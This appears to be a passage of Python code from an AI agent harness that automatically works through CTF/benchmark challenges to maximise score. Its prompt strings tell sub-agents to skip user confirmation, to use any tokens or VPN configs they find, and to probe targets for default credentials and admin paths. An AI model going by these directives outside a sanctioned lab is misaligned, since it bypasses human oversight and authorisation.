                    "根路径、headers、robots、docs、静态资源、源码注释、默认凭证、"
                    "/flag、/admin；只尝试一个主假设和一个备选假设。发现 flag/secret/"
                    "候选答案立即 submit，禁止先读文档或继续扫描；若页面/API/框架线索已可达"
                    "但没有直接 flag，保留 active 并切回推理管线；只有确认低价值或连续不可达"
                    f"达到 {retry_limit} 次才 close 当前题。"
                ),
                "context": state_context,
                "parallel": False,
            },
        ])
        return subtasks

    def _benchmark_should_use_fast_path(self) -> tuple[bool, str]:
        """Use deterministic fast path while the active policy says it is productive."""
        if not self._is_benchmark_aggressive():
            return False, "Benchmark aggressive profile 未启用。"
        with self._benchmark_state_lock:
            state = self._benchmark_state_snapshot_unlocked()
            snapshot = self._benchmark_state.get("last_challenges_snapshot")
            current = self._benchmark_state.get("current_challenge")

        if state.get("task_finished"):
            return True, "平台已 finished/invalid_state，fast path 只负责硬停。"
        if not isinstance(snapshot, list) or not snapshot:
            return True, "尚无平台题目快照，fast path 先做 setup/list。"

        completed = set(state.get("completed_challenges") or [])
        closed = set(state.get("closed_challenges") or [])
        abandoned = set(state.get("abandoned_challenges") or [])
        recovered = set(state.get("recovery_attempted_challenges") or [])
        reasoning = set(state.get("reasoning_challenges") or [])
        excluded = completed | closed | abandoned
        fast_difficulties = self._benchmark_fast_path_difficulties()
        handoff_difficulties = self._benchmark_handoff_difficulties()
        recovery_difficulties = self._benchmark_recovery_difficulties()

        if isinstance(current, str) and current and current not in excluded:
            if current in reasoning:
                difficulty_label = "当前题"
                for item in snapshot:
                    if isinstance(item, dict) and item.get("unique_code") == current:
                        difficulty_label = str(item.get("difficulty") or "当前题").lower()
                        break
                return (
                    False,
                    f"当前 {difficulty_label} 题 {current} 已有有效响应线索，切回四柱管线深挖。",
                )
            for item in snapshot:
                if not isinstance(item, dict) or item.get("unique_code") != current:
                    continue
                difficulty = str(item.get("difficulty") or "").lower()
                if difficulty in fast_difficulties:
                    return True, f"当前题 {current} 是 {difficulty}，继续 fast path。"
                if difficulty in handoff_difficulties:
                    return (
                        False,
                        f"当前题 {current} 是 {difficulty}，切回四柱管线。",
                    )

        for item in snapshot:
            if not isinstance(item, dict):
                continue
            code = item.get("unique_code")
            if not isinstance(code, str) or code in excluded or code in reasoning:
                continue
            if item.get("is_completed") is True:
                continue
            difficulty = str(item.get("difficulty") or "").lower()
            if difficulty not in fast_difficulties:
                continue
            if (
                self._benchmark_is_startable_status(item)
                or self._benchmark_is_active_status(item)
            ):
                return True, f"仍有未完成 {difficulty} 候选 {code}，继续 fast path。"

        for item in snapshot:
            if not isinstance(item, dict):
                continue
            code = item.get("unique_code")
            if not isinstance(code, str) or code in completed:
                continue
            if item.get("is_completed") is True:
                continue
            difficulty = str(item.get("difficulty") or "").lower()
            if difficulty not in recovery_difficulties:
                continue
            if (
                self._benchmark_is_startable_status(item)
                and code in (closed | abandoned)
                and code not in recovered
            ):
                return (
                    True,
                    f"发现平台仍可启动的 {difficulty} {code} 被本地关闭/放弃状态误排除，"
                    "进入恢复 fast path。",
                )

        has_untried_non_easy = any(
            isinstance(item, dict)
            and isinstance(item.get("unique_code"), str)
            and item.get("unique_code") not in excluded
            and item.get("is_completed") is not True
            and str(item.get("difficulty") or "").lower() in handoff_difficulties
            and (
                self._benchmark_is_startable_status(item)
                or self._benchmark_is_active_status(item)
            )
            for item in snapshot
        )
        if has_untried_non_easy:
            return False, "fast path 候选已无新题，切回四柱处理中/高难度题。"

        return False, "未发现未完成 fast path 候选，切回四柱管线处理中/高难度题。"

    def _build_execution_profile_guidance(self) -> str:
        benchmark_guidance = self._build_benchmark_profile_guidance()
        if self._is_aggressive_execution():
            return (
                "当前为 aggressive（授权执行优先）模式：用户已通过授权模式、自动审批、"
                "根路径授权或等价权限、自动决策表达执行意图。除非遇到真实阻塞、"
                "不可逆破坏性操作、凭证外传、越权外部目标或任务已结束，否则不要把"
                "可自行验证的事项改成询问用户。优先读取现有文件、检查环境、执行命令、"
                "连接用户提供的 VPN 配置、按文档调用 API，并根据真实输出继续推进。"
                "Benchmark/CTF/靶场任务中，如果已发现 token、base URL、VPN 配置或 API 文档，"
                "应直接按标准流程执行：VPN/连通预检、列题、启动容器、解题、提交、关闭；"
                "不要退化为模拟方案、路径 A/B/C 选择题或要求用户再次确认已提供的信息。"
                + benchmark_guidance
            )
        return (
            "当前为 conservative（确认优先）模式：缺少明确授权或自动审批时，"
            "对可能改变系统状态、网络状态或外部服务状态的操作先解释并在必要时请求确认。"
            + benchmark_guidance
        )

    def _aggressive_planning_instruction(self) -> str:
        parts: list[str] = []
        if self._is_aggressive_execution():
            parts.append(
                "\n\n## 激进执行规划约束\n"
                "- 不要把“请求用户确认/请选择路径/请提供已存在文件内容”作为子任务，"
                "除非工具已验证确实缺少必要信息。\n"
                "- 计划必须优先包含可执行动作：读取文档、检查 VPN 客户端、连接 VPN、"
                "执行连通预检、curl API、解析题目、启动/关闭容器、提交结果等。\n"
                "- 已在工作目录发现的文件、token、base URL、VPN 配置视为用户已提供，直接使用。\n"
                "- 对 Benchmark/CTF/靶场任务，默认目标是按标准流程推进拿分，"
                "不要退化为模拟推演或让用户在 A/B/C 路径中选择。\n"
                "- 只有遇到 token 无效、任务结束、VPN 不可达、资源持续不可用、"
                "权限不足或破坏性不可逆操作时，才停止并请求用户决策。"
            )
        if self._is_benchmark_aggressive():
            parts.append(self._benchmark_planning_instruction())
        return "".join(parts)

    def _build_benchmark_profile_guidance(self) -> str:
        if not self._is_benchmark_aggressive():
            return ""
        return (
            "\n\n当前已启用 Benchmark aggressive profile：目标是最大化总分，"
            "不是单题完美解。平台 API 默认走可达公网/物理网卡，容器访问走 VPN/tun0；"
            "每题先做快速指纹和 obvious flag 检查，发现疑似 flag 立即 submit；"
            "连续多轮没有 submit、flag 或可验证新发现时，必须 close 当前题并切换下一题。"
        )

    def _benchmark_planning_instruction(self) -> str:
        target_score = self._resolve_benchmark_target_score()
        target_line = ""
        estimate = max(1, self._benchmark_estimated_fast_score())
        fast_label = self._benchmark_policy_difficulty_label("fast_path_difficulties")
        handoff_label = self._benchmark_policy_difficulty_label("handoff_difficulties")
        order_label = self._benchmark_selection_order_label()
        if target_score > 0:
            status = self._benchmark_score_status()
            progress_line = ""
            if status.get("known_score"):
                progress_line = (
                    f"当前已知得分 {status['known_score']}/{target_score}，"
                    f"距离目标 {status['remaining']}；"
                    "未达目标前不要输出最终总结。\n"
                )
            gap_line = ""
            if status.get("gap_mode"):
                gap_line = (
                    "- 当前已进入 gap mode：优先拿任意正分补齐差额，"
                    "不要为单题满分继续深挖；默认禁止 hint 扣分。\n"
                )
            elif status.get("rush_mode"):
                gap_line = (
                    f"- 当前已进入 rush mode：距离目标不超过 "
                    f"{BENCHMARK_RUSH_REMAINING_THRESHOLD} 分。"
                    "发现 flag{...} 后下一次工具调用必须 submit，"
                    "不得再读 API 文档、复核字段或继续扫描。\n"
                )
            target_line = (
                f"- 本轮目标分数为 {target_score}。优先冲刺到目标分："
                f"按 selection_policy 估算每道 fast-path 题约 {estimate} 分，"
                "优先快速完成约 "
                f"{max(1, (target_score + estimate - 1) // estimate)} 道 "
                f"{fast_label}/低 level 题；"
                "不要因单题深挖影响整体得分上限。\n"
                f"{progress_line}"
                f"{gap_line}"
            )
        else:
            target_line = (
                "- 当前为正式测评 maximize mode：不设置固定目标分，"
                "平台未返回 finished/invalid_state 前持续争取更高总分；"
                "不要因为已达到历史分数、默认轮次或阶段性总结而停止。\n"
            )
        return (
            "\n\n## Benchmark aggressive 跑分约束\n"
            "- 最高目标是单位时间得分。不要为了单题完整性牺牲整体进度。\n"
            f"{target_line}"
            "- 若设置了 target score，它只是最低门槛；若未设置 target score，"
            "则进入 maximize mode。平台未 finished/invalid_state 时，不得把任务判定为完成。\n"
            "- 单题默认预算 90 秒；连续 1 轮无 submit、无 flag、无新可验证突破时，"
            "下一轮第一任务必须 POST close 当前 unique_code，然后 start 下一道未完成题；"
            "gap mode 下 1 轮无进展就切题。\n"
            "- 若已完成一道题，必须立即 close 并刷新题目列表，继续下一道未完成题；目标未达成前不要停在复盘或改脚本。\n"
            "- 禁止开局批量调用 hint；hint 会扣分。只允许按用户明确临场指令使用 hint。\n"
            "- submit/close 必须短任务化：submit 返回 correct/incorrect/duplicate 后立即停止当前子任务并返回，不得继续探测同一容器。\n"
            "- 每题只保留一个主攻击假设和一个备选假设；同类 payload、路径扫描、字典爆破不可反复堆叠。\n"
            "- 发现 flag 形态字符串、疑似 secret、后台响应里的候选答案时，立即调用 submit 验证，"
            "不要等总结阶段，不要先读文档复核接口。\n"
            f"- 选题顺序来自 selection_policy（当前 {order_label}）；"
            f"{fast_label} 题优先 deterministic/adaptive fast path，"
            f"{handoff_label} 题切回四柱深挖。若指纹不匹配，快速切题。\n"
            "- 平台接口（/openapi/v1/challenges、start、submit、close）走已验证可达的公网/物理网卡；"
            "容器地址 10.x 访问走 VPN/tun0。\n"
            "- 每道题完成、放弃或 stale 后必须 close 释放活跃名额。"
        )

    def _build_system_context(self) -> str:
        from datetime import datetime, timezone
        import os
        now = datetime.now(timezone.utc).astimezone()
        return (
            f"当前日期时间: {now.strftime('%Y年%m月%d日 %H:%M')} "
            f"({now.strftime('%A')}, ISO {now.strftime('%Y-%m-%d')})\n"
            f"当前工作目录: {os.getcwd()}\n"
            f"执行姿态: {self._resolve_execution_profile()}\n"
            f"Benchmark profile: {self._resolve_benchmark_profile()}\n"
        )

    def _consume_benchmark_forced_directive(self) -> str:
        directive = self._benchmark_forced_directive
        self._benchmark_forced_directive = ""
        return directive

    def _update_benchmark_stale_state(self, round_results: list[str]) -> str:
        """Return a forced directive when a Benchmark challenge should be abandoned."""
        if not self._is_benchmark_aggressive():
            return ""

        text = "\n".join(round_results)
        lowered = text.lower()
        challenges = self._benchmark_extract_unique_codes(text)
        latest_challenge = challenges[-1] if challenges else self._benchmark_current_challenge
        if latest_challenge and latest_challenge != self._benchmark_current_challenge:
            self._benchmark_current_challenge = latest_challenge
            self._benchmark_stale_rounds = 0

        has_success_signal = any(
            marker in lowered
            for marker in (
                '"correct":true',
                '"correct":false',
                "'correct': true",
                "'correct': false",
                "duplicate",
                "通关",
            )
        ) or bool(
            _re_mod.search(
                r"['\"](?:correct_flag_count|cumulative_score|awarded)['\"]\s*:",
                text,
            )
        )
        has_flag_signal = bool(
            _re_mod.search(r"\b(?:flag|ctf|tsec)\{[^}\s]{4,}\}", text, _re_mod.IGNORECASE)
        )
        has_close_signal = (
            "close?unique_code" in lowered
            or bool(_re_mod.search(r"['\"]closed['\"]\s*:\s*true", text))
        )
        has_reasoning_signal = any(
            marker in text
            for marker in (
                "已获取有效响应",
                "保留 active",
                "切回四柱",
                "切回推理",
                "已有有效响应线索",
            )
        )

        if has_success_signal or has_flag_signal or has_close_signal or has_reasoning_signal:
            self._benchmark_stale_rounds = 0
            return ""

        if self._benchmark_current_challenge is None:
            return ""

        with self._benchmark_state_lock:
            reasoning = set(self._benchmark_state.get("reasoning_challenges", set()))
        if self._benchmark_current_challenge in reasoning:
            self._benchmark_stale_rounds = 0
            self._record_trace(
                "benchmark_stale_suppressed",
                detail=(
                    f"{self._benchmark_current_challenge} 已有有效响应线索，"
                    "跳过 stale/abandoned 判定。"
                ),
                metadata={"challenge": self._benchmark_current_challenge},
            )
            return ""

        low_value_count = self._benchmark_low_value_signal_count(text)
        force_low_value_switch = low_value_count >= BENCHMARK_LOW_VALUE_SIGNAL_LIMIT
        self._benchmark_stale_rounds += 1
        self._record_trace(
            "benchmark_progress",
            detail=(
                f"{self._benchmark_current_challenge}: stale_rounds="
                f"{self._benchmark_stale_rounds}, low_value_count={low_value_count}"
            ),
            metadata={
                "challenge": self._benchmark_current_challenge,
                "stale_rounds": self._benchmark_stale_rounds,
                "low_value_count": low_value_count,
                "profile": self._resolve_benchmark_profile(),
            },
        )

        score_status = self._benchmark_score_status()
        threshold = 1 if score_status.get("gap_mode") else 2
        if self._benchmark_stale_rounds < threshold and not force_low_value_switch:
            return ""

        gap_text = ""
        if score_status.get("gap_mode"):
            gap_text = (
                f"当前距离目标只差 {score_status.get('remaining')} 分，"
                "已进入 gap mode，禁止继续深挖当前题。"
            )
        directive = (
            "Benchmark stale detector 已触发："
            f"当前题 {self._benchmark_current_challenge} 已连续 "
            f"{self._benchmark_stale_rounds} 轮没有 submit、flag 或可验证得分进展。"
            f"本轮低价值探测信号 {low_value_count} 次。"
            f"{gap_text}"
            "下一轮必须把第一优先级改为："
            f"1) 调用平台 close?unique_code={self._benchmark_current_challenge} 释放容器；"
            "2) 获取题目列表；"
            f"3) 按 selection_policy（当前 {self._benchmark_selection_order_label()}）"
            "选择下一道未完成题 start；"
            "4) 对新题执行快速拿分流程。不要继续在当前题重复 SQLi/SSTI/session/path payload。"
        )
        with self._benchmark_state_lock:
            abandoned = set(self._benchmark_state.get("abandoned_challenges", set()))
            abandoned.add(self._benchmark_current_challenge)
            self._benchmark_state["abandoned_challenges"] = abandoned
        self._record_trace(
            "benchmark_stale_detected",
            detail=directive,
            metadata={
                "challenge": self._benchmark_current_challenge,
                "stale_rounds": self._benchmark_stale_rounds,
                "low_value_count": low_value_count,
                "threshold": threshold,
                "score_status": score_status,
                "action": "close_and_switch",
            },
        )
        self._persist_benchmark_state()
        self._benchmark_stale_rounds = 0
        return directive

    @staticmethod
    def _benchmark_low_value_signal_count(text: str) -> int:
        lowered = text.lower()
        markers = (
            "internal server error",
            "method not allowed",
            "not found",
            "no jobs found",
            "only admins can see",
            "could not validate credentials",
            "输出:\n[]",
            "输出: []",
            " 404 ",
            "404 /",
        )
        return sum(lowered.count(marker) for marker in markers)

    @staticmethod
    def _extract_text(response: Any) -> str:
        content = getattr(response, "content", "")
        if isinstance(content, list):
            return "".join(
                item if isinstance(item, str) else str(item.get("text", ""))
                for item in content
            )
        return str(content)

    @staticmethod
    def _parse_json(text: str) -> dict[str, Any]:
        text = text.strip()
        if text.startswith("```"):
            lines = text.split("\n")
            if lines[0].startswith("```"):
                lines = lines[1:]
            if lines and lines[-1].strip() == "```":
                lines = lines[:-1]
            text = "\n".join(lines)
        try:
            return json.loads(text)
        except json.JSONDecodeError:
            match = _re_mod.search(r"\{[\s\S]*\}", text)
            if match:
                try:
                    return json.loads(match.group())
                except json.JSONDecodeError:
                    pass
        return {}

    @staticmethod
    def _format_subtask_agent_label(role_str: str) -> str:
        normalized_role = role_str or "runner"
        return f"{normalized_role} Agent"

    @classmethod
    def _format_subtask_checklist_line(
        cls,
        index: int,
        task: dict,
        *,
        selected: bool,
    ) -> str:
        role_str = str(task.get("role", "runner"))
        desc = str(task.get("task_description", str(task))).replace("\n", " ")
        mode = "并行" if task.get("parallel", False) else "顺序"
        marker = "○" if selected else "－"
        status = "待执行" if selected else "未选择"
        return (
            f"  [dim]{marker}[/] #{index + 1:02d} "
            f"[cyan]{cls._format_subtask_agent_label(role_str)}[/] "
            f"[dim]({mode}, {status})[/] {desc[:120]}"
        )

    def _print_subtask_checklist(
        self,
        subtasks: list[dict],
        selected_indices: list[int],
        *,
        iteration: int,
    ) -> None:
        selected_set = set(selected_indices)
        self._renderer.console.print()
        self._renderer.console.print(
            f"[dim bold]📋 子 Agent 任务清单 · 第 {iteration} 轮[/]"
        )
        for index, task in enumerate(subtasks):
            self._renderer.console.print(
                self._format_subtask_checklist_line(
                    index,
                    task,
                    selected=index in selected_set,
                )
            )
        self._record_trace(
            "subtasks_selected",
            detail=f"第 {iteration} 轮选择 {len(selected_indices)}/{len(subtasks)} 个子任务",
            metadata={
                "iteration": iteration,
                "selected_indices": selected_indices,
                "subtasks": [
                    {
                        "index": index,
                        "role": str(task.get("role", "runner")),
                        "description": str(
                            task.get("task_description", str(task))
                        ),
                        "parallel": bool(task.get("parallel", False)),
                        "selected": index in selected_set,
                    }
                    for index, task in enumerate(subtasks)
                ],
            },
        )

    def _print_subtask_status(
        self,
        index: int,
        role_str: str,
        desc: str,
        status: str,
        *,
        detail: str = "",
        parallel: bool = False,
    ) -> None:
        status_styles = {
            "start": ("⏳", "yellow", "开始"),
            "done": ("✓", "green", "完成"),
            "fail": ("✗", "red", "失败"),
            "skip": ("－", "dim", "跳过"),
        }
        icon, style, label = status_styles.get(status, ("•", "dim", status))
        mode = "并行" if parallel else "顺序"
        suffix = f" [dim]{detail}[/]" if detail else ""
        self._renderer.console.print(
            f"  [{style}]{icon}[/] #{index + 1:02d} "
            f"[cyan]{self._format_subtask_agent_label(role_str)}[/] "
            f"[dim]({mode})[/] {label}: {desc[:90]}{suffix}"
        )
        self._record_trace(
            "subtask_status",
            detail=desc,
            metadata={
                "index": index,
                "role": role_str,
                "agent_label": self._format_subtask_agent_label(role_str),
                "status": status,
                "status_label": label,
                "detail": detail,
                "parallel": parallel,
                "mode": mode,
            },
        )

    # ══════════════════════════════════════════════════════════════
    # 管线主入口
    # ══════════════════════════════════════════════════════════════
    def run(self, user_input: str, auto_decision: bool = False) -> None:
        """执行完整的四柱管线。"""
        renderer = self._renderer
        self._consecutive_failures = 0
        self._trace = []
        self._final_summary = ""
        self._benchmark_profile_active = (
            str(self._runtime_context.get("benchmark_profile", "off")).strip().lower()
            == "aggressive"
            or (
                str(self._runtime_context.get("benchmark_profile", "off")).strip().lower()
                == "auto"
                and self._looks_like_benchmark_task(user_input)
            )
        )
        self._benchmark_current_challenge = None
        self._benchmark_stale_rounds = 0
        self._benchmark_forced_directive = ""
        self._benchmark_redundant_block_count = 0
        self._benchmark_hard_stop_recorded = False
        self._runtime_context["_benchmark_iteration_batch_count"] = 1
        with self._benchmark_state_lock:
            self._benchmark_state = self._new_benchmark_state()
        self._session_id = str(
            self._runtime_context.get("session_id")
            or datetime.now().strftime("%Y%m%d_%H%M%S")
        )
        self._trace_id = (
            f"{self._session_id}-{datetime.now().strftime('%Y%m%d_%H%M%S')}"
        )
        self._load_benchmark_state()

        self._append_pipeline_user_message(user_input)
        self._record_trace("pipeline_start", detail=user_input)
        self._record_trace(
            "execution_profile",
            detail=self._resolve_execution_profile(),
            metadata={
                "execution_profile": self._resolve_execution_profile(),
                "benchmark_profile": self._resolve_benchmark_profile(),
                "benchmark_target_score": self._resolve_benchmark_target_score(),
                "auto_decision": bool(self._runtime_context.get("auto_decision", False)),
            },
        )

        try:
            self._run_phases(user_input, auto_decision)
            self._record_trace("pipeline_complete")
        except PipelineCircuitBreakerError as exc:
            renderer.console.print()
            renderer.console.print(
                f"  [bold red]⛔ 熔断中止: {exc}[/]"
            )
            self._record_trace("pipeline_abort", detail=str(exc))
        except Exception as exc:
            self._record_trace("pipeline_error", detail=str(exc))
            raise
        finally:
            # 同步 token 到 renderer
            self._renderer.add_token_usage(
                self.cumulative_input_tokens,
                self.cumulative_output_tokens,
            )
            self._append_pipeline_summary_message()
            self._persist_benchmark_state()
            self._save_trace()

    def _run_benchmark_fast_phases(self, user_input: str) -> bool:
        """Run Benchmark aggressive as a policy-driven score-first loop."""
        renderer = self._renderer
        renderer.console.print()
        renderer.console.print("[dim bold]🏁 Benchmark aggressive fast path[/]")
        renderer.console.print(
            "[dim]跳过四柱思考、决策者、思考者、审计者和反思者；"
            "按平台状态和 selection_policy 执行确定性 runner 循环。[/]"
        )
        self._record_trace(
            "benchmark_fast_path",
            detail="Benchmark aggressive 跳过角色编排，使用策略驱动的确定性刷题循环。",
        )

        max_iterations_per_batch = self._resolve_effective_max_iterations()
        max_iterations = max_iterations_per_batch * BENCHMARK_MAX_ITERATION_BATCHES
        all_results: list[list[str]] = []
        iteration = 0
        switch_to_standard = False

        for iteration in range(1, max_iterations + 1):
            if iteration > 1 and (iteration - 1) % max_iterations_per_batch == 0:
                if not self._benchmark_should_continue_iteration_batches(
                    source="benchmark_fast",
                    completed_iterations=iteration - 1,
                ):
                    iteration -= 1
                    break
            batch_iteration = ((iteration - 1) % max_iterations_per_batch) + 1
            batch_count = int(
                self._runtime_context.get("_benchmark_iteration_batch_count", 1) or 1
            )
            renderer.console.print()
            renderer.console.print(
                f"[dim bold]⚡ Benchmark fast loop 第 {batch_iteration}/{max_iterations_per_batch} 轮"
                f"（第 {batch_count} 批，总第 {iteration} 轮）[/]"
            )
            self._record_trace("iteration_start", detail=f"Benchmark fast 第 {iteration} 轮")
            if self._benchmark_stop_if_terminal("fast_iteration_start"):
                self._record_trace("iteration_done", detail="Benchmark 已终止")
                break
            should_fast, fast_reason = self._benchmark_should_use_fast_path()
            self._record_trace(
                "benchmark_fast_path_decision",
                detail=fast_reason,
                metadata={"use_fast_path": should_fast},
            )
            if not should_fast:
                renderer.console.print(
                    f"  [dim yellow]↻ {fast_reason}[/]"
                )
                switch_to_standard = True
                break

            status = self._benchmark_score_status()
            if status.get("target_reached"):
                self._record_trace(
                    "iteration_done",
                    detail=(
                        f"Benchmark 目标已达成："
                        f"{status.get('known_score')}/{status.get('target_score')}"
                    ),
                )
                break

            forced_benchmark_directive = self._consume_benchmark_forced_directive()
            benchmark_state_context = self._benchmark_state_context()
            additional_context = forced_benchmark_directive
            if benchmark_state_context:
                additional_context = (
                    f"{additional_context}\n\n{benchmark_state_context}"
                    if additional_context
                    else benchmark_state_context
                )

            subtasks = self._benchmark_fast_cycle_subtasks()
            selected_indices = list(range(len(subtasks)))
            reasoning = (
                "Benchmark aggressive fast path：单位时间得分优先，"
                "按平台状态执行 close/list/start 与 fingerprint/exploit/submit/close。"
            )
            renderer.console.print(
                f"  [dim green]✓ 策略调度 {len(subtasks)} 个 runner 子任务[/]"
            )
            self._print_subtask_checklist(
                subtasks,
                selected_indices,
                iteration=iteration,
            )

            base_timeout, timeout_step, max_escalations = self._subtask_timeout_config()
            renderer.console.print()
            renderer.console.print(
                f"[dim bold]🔧 执行 {len(selected_indices)} 个子任务[/]"
                f" [dim](超时={base_timeout}s"
                f"+{max_escalations}×{timeout_step}s,"
                f" 熔断={CIRCUIT_BREAKER_CONSECUTIVE_FAILS})[/]"
            )
            self._record_trace(
                "subtask_scheduler_config",
                detail="strategy=benchmark_fast, max_subagents=1",
                metadata={
                    "strategy": "benchmark_fast",
                    "max_subagents": 1,
                },
            )

            round_results: list[str] = []
            circuit_broken = False
            for idx in selected_indices:
                try:
                    self._check_circuit_breaker()
                except PipelineCircuitBreakerError as exc:
                    renderer.console.print(f"  [bold red]⛔ {exc}[/]")
                    circuit_broken = True
                    break

                task = subtasks[idx]
                role_str = str(task.get("role", "runner"))
                desc = str(task.get("task_description", str(task)))
                ctx = str(task.get("context", ""))
                if additional_context:
                    ctx = f"{ctx}\n补充: {additional_context}" if ctx else additional_context

                if "Benchmark fast step 2" in desc:
                    state = self._benchmark_state_snapshot()
                    current = state.get("current_challenge")
                    active = state.get("active_containers") or {}
                    if not (isinstance(current, str) and current) and not active:
                        refreshed_code, refreshed_addrs = (
                            self._benchmark_refresh_active_challenge_from_platform()
                        )
                        if refreshed_code and refreshed_addrs:
                            current = refreshed_code
                            active = {refreshed_code: refreshed_addrs}
                    if not (isinstance(current, str) and current) and not active:
                        skipped = "跳过：当前没有已启动的 10.x 容器，先回到调度步骤。"
                        renderer.console.print(f"  [dim yellow]－ {skipped}[/]")
                        self._print_subtask_status(
                            idx,
                            role_str,
                            desc,
                            "skip",
                            detail="无活跃容器",
                        )
                        self._record_trace(
                            "benchmark_fast_step_skipped",
                            detail=skipped,
                            metadata={"reason": "no_active_container"},
                        )
                        round_results.append(f"## [{role_str}] {desc}\n❌ {skipped}")
                        continue

                renderer.console.print(f"  [dim]── [{role_str}] {desc[:80]}...[/]")
                self._print_subtask_status(idx, role_str, desc, "start")
                start = time_mod.monotonic()
                self._record_trace("subtask_start", detail=f"[{role_str}] {desc[:200]}")

                deterministic_result: str | None = None
                deterministic_step = ""
                score_status = self._benchmark_score_status()
                should_run_deterministic = (
                    "Benchmark fast setup" in desc
                    or "Benchmark fast step 1" in desc
                    or "Benchmark fast step 2" in desc
                )
                if should_run_deterministic:
                    deterministic_step = (
                        "setup"
                        if "Benchmark fast setup" in desc
                        else (
                            "step2"
                            if "Benchmark fast step 2" in desc
                            else "step1"
                        )
                    )
                    try:
                        deterministic_result = self._benchmark_deterministic_fast_step(
                            desc,
                            reason=(
                                "deterministic_probe_submit_close"
                                if deterministic_step == "step2"
                                else "deterministic_scheduler"
                            ),
                        )
                    except Exception as exc:
                        self._record_trace(
                            "benchmark_deterministic_fast_failed",
                            detail=str(exc),
                            metadata={"step": deterministic_step},
                        )
                        deterministic_result = None
                if deterministic_result is not None:
                    elapsed = (time_mod.monotonic() - start) * 1000
                    renderer.console.print(
                        f"  [dim green]✓ 确定性 fast step 完成[/] [dim]({elapsed:.0f}ms)[/]"
                    )
                    result_head = self._benchmark_result_head(deterministic_result)
                    if result_head:
                        renderer.console.print(f"    [dim]{result_head}[/]")
                    self._print_subtask_status(
                        idx,
                        role_str,
                        desc,
                        "done",
                        detail=f"deterministic {elapsed:.0f}ms",
                    )
                    self._record_trace(
                        "benchmark_deterministic_fast_step",
                        detail=deterministic_result[:1000],
                        metadata={
                            "step": deterministic_step,
                            "score_status": score_status,
                        },
                    )
                    round_results.append(f"## [{role_str}] {desc}\n{deterministic_result}")
                    self._consecutive_failures = 0
                    self._benchmark_reset_setup_timeout_streak()
                    self._emit_compression_notice()
                    if self._benchmark_stop_if_terminal("fast_deterministic_step_end"):
                        circuit_broken = True
                        break
                    should_continue_fast, handoff_reason = self._benchmark_should_use_fast_path()
                    self._record_trace(
                        "benchmark_fast_path_post_step_decision",
                        detail=handoff_reason,
                        metadata={
                            "use_fast_path": should_continue_fast,
                            "step": deterministic_step,
                        },
                    )
                    if not should_continue_fast:
                        renderer.console.print(
                            f"  [dim yellow]↻ {handoff_reason}[/]"
                        )
                        switch_to_standard = True
                        circuit_broken = True
                        break
                    continue

                subtask_prompt = self._build_subtask_prompt(
                    role_str,
                    desc,
                    ctx=ctx,
                    reasoning=reasoning,
                    aggressive=self._is_aggressive_execution(),
                    benchmark_profile=self._resolve_benchmark_profile(),
                    benchmark_state_context=self._benchmark_state_context(),
                )

                try:
                    result = self._run_subtask_with_escalating_timeout(
                        subtask_prompt,
                        get_role_label(self._str_to_role(role_str)),
                        desc,
                    )
                    elapsed = (time_mod.monotonic() - start) * 1000
                    renderer.console.print(
                        f"  [dim green]✓ 完成[/] [dim]({elapsed:.0f}ms, {len(result)}字)[/]"
                    )
                    self._print_subtask_status(
                        idx,
                        role_str,
                        desc,
                        "done",
                        detail=f"{elapsed:.0f}ms, {len(result)}字",
                    )
                    self._record_trace("subtask_complete", detail=result[:500])
                    round_results.append(f"## [{role_str}] {desc}\n{result}")
                    self._consecutive_failures = 0
                    self._benchmark_reset_setup_timeout_streak()
                except TimeoutError as exc:
                    elapsed = (time_mod.monotonic() - start) * 1000
                    self._record_trace("subtask_timeout", detail=str(exc))
                    renderer.console.print(
                        f"  [dim red]⏰ Benchmark fast 子任务超时[/] [dim]({elapsed:.0f}ms)[/]"
                    )
                    self._print_subtask_status(
                        idx,
                        role_str,
                        desc,
                        "fail",
                        detail=f"超时 {elapsed:.0f}ms",
                    )
                    setup_stop_reason = self._benchmark_setup_timeout_stop_reason(str(exc))
                    if setup_stop_reason:
                        round_results.append(f"## [{role_str}] {desc}\n❌ {setup_stop_reason}")
                        circuit_broken = True
                        break
                    fallback_result = None
                    if "Benchmark fast step 2" in desc:
                        try:
                            fallback_result = self._benchmark_deterministic_fast_step(
                                desc,
                                reason=f"timeout:{str(exc)[:160]}",
                            )
                        except Exception as fallback_exc:
                            self._record_trace(
                                "benchmark_deterministic_fast_failed",
                                detail=str(fallback_exc),
                                metadata={
                                    "step": "step2_timeout",
                                    "original_error": str(exc)[:300],
                                },
                            )
                    if fallback_result is not None:
                        self._record_trace(
                            "benchmark_deterministic_fast_step",
                            detail=fallback_result[:1000],
                            metadata={
                                "reason": "subtask_timeout",
                                "original_error": str(exc)[:300],
                            },
                        )
                        round_results.append(f"## [{role_str}] {desc}\n{fallback_result}")
                        self._consecutive_failures = 0
                        self._benchmark_reset_setup_timeout_streak()
                        continue
                    timeout_directive = self._benchmark_timeout_directive(str(exc))
                    if timeout_directive:
                        self._benchmark_forced_directive = timeout_directive
                        renderer.console.print(
                            "  [dim yellow]Benchmark 子任务超时，下一轮强制 close 并换题。[/]"
                        )
                    self._consecutive_failures = 0
                    round_results.append(
                        f"## [{role_str}] {desc}\n❌ Benchmark 子任务超时，已止损换题: {exc}"
                    )
                except Exception as exc:
                    elapsed = (time_mod.monotonic() - start) * 1000
                    fallback_result: str | None = None
                    if self._is_transient_llm_error(str(exc)):
                        try:
                            fallback_result = self._benchmark_deterministic_fast_step(
                                desc,
                                reason=str(exc)[:200],
                            )
                        except Exception as fallback_exc:
                            self._record_trace(
                                "benchmark_deterministic_fast_failed",
                                detail=str(fallback_exc),
                                metadata={
                                    "step": "step2"
                                    if "Benchmark fast step 2" in desc
                                    else "unknown",
                                    "original_error": str(exc)[:300],
                                },
                            )
                            fallback_result = None
                    if fallback_result is not None:
                        self._record_trace(
                            "benchmark_deterministic_fast_step",
                            detail=fallback_result[:1000],
                            metadata={
                                "reason": "llm_transient_error",
                                "original_error": str(exc)[:300],
                            },
                        )
                        renderer.console.print(
                            "  [dim yellow]↻ 模型临时异常，已用确定性 fallback 推进当前 fast step。[/]"
                        )
                        self._print_subtask_status(
                            idx,
                            role_str,
                            desc,
                            "done",
                            detail="deterministic fallback",
                        )
                        round_results.append(f"## [{role_str}] {desc}\n{fallback_result}")
                        self._consecutive_failures = 0
                        self._benchmark_reset_setup_timeout_streak()
                        continue
                    if self._benchmark_rate_limit_backoff(
                        f"benchmark_fast_subtask_{idx}",
                        str(exc),
                    ):
                        round_results.append(
                            f"## [{role_str}] {desc}\n⚠️ 模型限流，已退避后继续。"
                        )
                        continue
                    self._consecutive_failures += 1
